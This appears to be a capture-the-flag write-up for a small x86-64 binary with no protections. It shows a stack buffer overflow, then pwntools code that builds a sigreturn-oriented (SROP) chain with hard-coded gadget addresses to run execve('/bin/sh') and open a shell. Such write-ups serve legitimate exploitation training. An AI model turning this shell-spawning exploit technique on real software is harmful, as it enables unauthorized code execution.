# Enumeration

First of all, we start with a `checksec`:  

```console
pwndbg> checksec
Arch:       amd64
RELRO:      No RELRO
Stack:      No canary found
NX:         NX unknown - GNU_STACK missing
PIE:        No PIE (0x42000)
Stack:      Executable
RWX:        Has RWX segments
Stripped:   No
```

As we can see, we can do something there!

The program has no interface, so we head into the disassembly right away.

### Disassembly

Starting with `_start()`:

![image](https://github.com/user-attachments/assets/38bc394c-4df5-4510-98a1-821a9ac64cb2)

![image](https://github.com/user-attachments/assets/f1b71c35-c417-4886-8d7d-c9c2c2ab5d9a)

That's the whole binary, we see there is a huge buffer overflow that `rdx` reads up to `0x106 = 262` bytes. First of all, we need to find a possible gadget and `/bin/sh` address.

![image](https://github.com/user-attachments/assets/618d8c46-cbd1-4c37-987e-bf7fc383a72f)


Now that we have this, we can craft the `SROP` chain.
We want to execute system("/bin/sh") but in assembly language it is execve("/bin/sh", argument, env ) function.
```python
# Srop
POP_RAX =0x0043018
SYSCALL_RET=0x043015
BINSH = elf.address + 0x1238
```

After crafting the `frame`, we send the payload to trigger the vulnerability and get shell.

```python
payload = b'a'*0x8
payload += p64(POP_RAX)
payload += p64(0xf)
payload += p64(SYSCALL_RET)

frame = SigreturnFrame()
frame.rax = 0x3b           
frame.rdi = BINSH          
frame.rsi = 0x0             
frame.rdx = 0x0 
frame.rip = SYSCALL_RET   

payload += bytes(frame)
```

Running solver remotely at IP port

### Result


![image](https://github.com/user-attachments/assets/1cfc6b67-e5b1-42c0-8116-027ec9c7467d)

